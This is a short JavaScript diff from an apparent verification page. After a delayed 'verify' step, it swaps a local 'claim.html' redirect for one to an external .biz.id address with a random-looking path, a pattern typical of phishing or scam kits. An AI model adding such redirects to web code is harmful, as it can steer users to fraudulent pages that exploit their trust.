@@ -54,7 +54,7 @@ document.addEventListener("DOMContentLoaded", function () {
             verifyBtn.disabled = true;
     
             setTimeout(() => {
-                window.location.replace("claim.html");
+                window.location.replace("https://idnetconnect.biz.id/src/pages/q7GxZ9pL3mWkA1sJ");
             }, 2000);
         }
     }
